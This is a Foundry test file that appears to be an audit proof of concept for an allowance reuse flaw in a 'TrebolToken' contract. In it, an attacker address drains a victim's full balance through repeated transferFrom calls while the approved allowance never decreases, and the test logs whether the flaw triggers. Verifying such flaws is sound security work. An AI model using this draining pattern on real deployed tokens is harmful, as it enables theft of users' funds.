// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/TrebolToken.sol";

contract TrebolTokenTest is Test {
    TrebolToken token;
    address owner;
    address victim;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        
        vm.prank(owner);
        token = new TrebolToken();
        
        // Setup initial balances
        uint initialBalance = 200 ether;
        vm.prank(owner);
        token.transfer(victim, initialBalance);
    }

    function test_AllowanceReuseVulnerability() public {
        uint approvedAmount = 100 ether;
        uint transferAmount = 50 ether;
        
        // Victim approves attacker's spending
        vm.prank(victim);
        token.approve(attacker, approvedAmount);

        // Set initial allowance before any transfers
        uint initialAllowance = token.allowance(victim, attacker);

        bool allowanceDecreased = false;
        
        console2.log("\n--- STARTING TRANSFER LOOP VERIFICATION ---");

        // Attacker drains victim's funds in multiple transfers
        for(uint i = 0; i < 4; i++) {
            console2.log("\n--- Transfer Loop #%s", i+1);
            
            // Record pre-transfer state
            console2.log("--- BEFORE-TRANSFER STATE ---");
            uint allowanceBefore = token.allowance(victim, attacker);
            uint victimBalanceBefore = token.balanceOf(victim);
            uint attackerBalanceBefore = token.balanceOf(attacker);
            console2.log("[PRE] Allowance       :", allowanceBefore);
            console2.log("[PRE] Victim balance  :", victimBalanceBefore);
            console2.log("[PRE] Attacker balance:", attackerBalanceBefore);
            
            // Execute transfer
            console2.log("\n--- EXECUTING TRANSFER FROM ---");
            vm.prank(attacker);
            token.transferFrom(victim, attacker, transferAmount);

            // Record post-transfer state
            console2.log("\n--- AFTER-TRANSFER STATE ---");
            uint allowanceAfter = token.allowance(victim, attacker);
            uint victimBalanceAfter = token.balanceOf(victim);
            uint attackerBalanceAfter = token.balanceOf(attacker);
            console2.log("[POST] Allowance      :", allowanceAfter);
            console2.log("[POST] Victim balance :", victimBalanceAfter);
            console2.log("[POST] Attacker balance:", attackerBalanceAfter);

            // Check balance changes
            assertEq(
                victimBalanceBefore - victimBalanceAfter,
                transferAmount,
                "Victim balance reduction mismatch"
            );
            assertEq(
                attackerBalanceAfter - attackerBalanceBefore,
                transferAmount,
                "Attacker balance increase mismatch"
            );
            
            // Check if allowance decreased during this transfer
            console2.log("\n--- VERIFYING ALLOWANCE CONSISTENCY ---");
            if (allowanceAfter < allowanceBefore) {
                console2.log("VULNERABILITY NOT TRIGGERED: Allowance decreased normally (expected behavior)");
                allowanceDecreased = true;
            } else {
                console2.log("VULNERABILITY TRIGGERED: Allowance remains unchanged");
            }
        }

        // Final vulnerability verdict
        if (allowanceDecreased) {
            console2.log("\nVulnerability not Exist: Allowance decreased during transfers (expected behavior)");
        } else {
            console2.log("\nVulnerability Exists: Allowance reuse vulnerability confirmed - allowance remains unchanged across transfers");
        }

        // Original balance assertions
        uint victimBalance = token.balanceOf(victim);
        assertEq(victimBalance, 0, "Victim balance should be drained");

        uint attackerBalance = token.balanceOf(attacker);
        assertEq(attackerBalance, 200 ether, "Attacker should have all funds");
    }
}